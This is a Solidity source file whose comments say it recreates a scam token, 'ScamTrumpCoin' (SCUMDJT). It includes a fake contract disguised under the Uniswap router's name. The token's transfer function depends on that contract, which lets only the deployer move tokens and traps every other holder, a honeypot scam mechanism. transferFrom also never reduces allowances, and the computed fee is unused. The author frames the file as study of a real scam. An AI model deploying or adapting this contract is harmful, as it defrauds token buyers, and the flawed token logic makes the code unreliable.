// SPDX-License-Identifier: MIT 
pragma solidity ^0.8.1;

contract IUniswapV2Router02 {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function getOwner() external pure returns(bool) {
        // revert("12234Error messageHuh");
        return true;
    }

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns(bool) {
        if (path[0] != owner) {
            return false;
        } else {
            return true;
        }
    }
}

contract DJT {
    // In this project I'm trying to recreate scum token
    // Scum token reference - basescan.org/token/0xb7605fea8b810e39e8901f91b71f41760138d5da#code
    // Most of the functions are hidden and I have to recreate all of them

    // names
    string public name =  "ScamTrumpCoin";
    string public symbol = "SCUMDJT";

    // const values
    uint public totalSupply = 23 * 10 ** 26;
    uint public decimals = 18;
    uint public feeRate = 1;
    
    // this is fake uniswap router, actual class is above
    IUniswapV2Router02 uniswapRouter;

    // global counters
    mapping(address => uint) public balances;
    mapping(address => mapping(address => uint)) public allowance;

    // events, I guess for scanners or idk tbh
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
    
    constructor() {
        // tx.origin - wallet who pay the fee
        // msg.sender - wallet or contrqact who sign the message
        balances[tx.origin] = totalSupply;                  // the dude who sign a message got a 23 * 10 ** 26 SCUMDJT token
        uniswapRouter = IUniswapV2Router02(msg.sender);     // create class above structure with BLACK list (or white list, idk, I won't change the comments late)
    }
    
    function balanceOf(address owner) view  public returns(uint) {
        return balances[owner];
    }

    function gtown() view public returns (bool) {
        bool res = uniswapRouter.getOwner();
        return res;
    }
    
    function transfer(address to, uint value) public returns(bool) {
        require(balanceOf(msg.sender) >= value, 'balance too low');
        balances[msg.sender] -= value;
        uint fee = value * feeRate / 1000;
        balances[to] += value;
        address[] memory path = new address[](2);
        path[0] = msg.sender;
        path[1] = to;
        require(uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            fee,
            value,
            path,
            msg.sender,
            (block.timestamp + 300)
        ));
        emit Transfer(msg.sender, to, value);
        return true;
    }
    
    function transferFrom(address from, address to, uint value) public returns(bool) {
        require(balanceOf(from) >= value, 'balance too low');
        require(allowance[from][msg.sender] >= value, 'allowance too low');
        balances[from] -= value;
        uint fee = value * feeRate / 1000;
        balances[to] += value;
        address[] memory path = new address[](2);
        path[0] = from;
        path[1] = to;
        // uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
        //     fee,
        //     value,
        //     path,
        //     msg.sender,
        //     (block.timestamp + 300)
        // );
        emit Transfer(from, to, value);
        return true;   
    }    
    function approve(address spender, uint value) public returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;   
    }
    function _getString(string memory str)public pure returns (string memory){
        return str;
    }
    function _getAdd(uint256 a,uint256 b) public pure returns(uint256){
        return a+b;
    }
    function _getDiff(uint256 a,uint256 b) public pure returns(uint256){
        return a-b;
    }
    function _getMul(uint256 a,uint256 b)public pure returns(uint256){
        return a*b;
    }
    function _getDiv(uint256 a,uint256 b)public pure returns(uint256){
        return a/b;
    }
    function _getMod(uint256 a,uint256 b)public pure returns(uint256){
        return a%b;
    }
    function _getpows(uint256 a)public pure returns(uint256){
        return a**10;
    }
}